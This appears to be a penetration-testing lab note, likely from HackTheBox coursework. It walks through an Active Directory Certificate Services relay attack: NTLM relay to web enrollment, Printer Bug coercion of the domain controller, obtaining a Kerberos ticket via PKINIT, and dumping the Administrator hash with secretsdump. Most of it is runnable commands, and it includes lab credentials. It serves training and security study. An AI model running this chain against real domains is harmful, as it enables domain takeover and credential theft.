### PKINIT (Public Key Cryptography for Initial Authentication)
Attackers can use Impacket's NTLMrelayx to listen for inbound connection and relay them to the web enrollemnt service using the following command
```bash
impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```
One can find templates using [Certipy](https://github.com/ly4k/Certipy.git)
A way to force machines accounts to authenticate against arbitrary host is by exploiting the [Printer Bug](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py)
```python
python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
```

One can now perform a pass-the-certificate attack to obtain a TGT as `DC01$`.
```bash
Lazarus2858@htb[/htb]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
Lazarus2858@htb[/htb]$ python3 -m venv .venv
Lazarus2858@htb[/htb]$ source .venv/bin/activate
Lazarus2858@htb[/htb]$ pip3 install -r requirements.txt
pip3 install -I git+https://github.com/wbond/oscrypto.git
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```

Once one has successfully obtain a TGT we are back to the Pass the Ticket Territory
```bash
Lazarus2858@htb[/htb]$ export KRB5CCNAME=/tmp/dc.ccache
Lazarus2858@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```

One Can also use `Bloodhound` with the `AddKeyCredentialLink` that will indicate that one user has write permissions over another user's `msDS-KeyCredentialLink` attribute, allowing them to take control of the user.
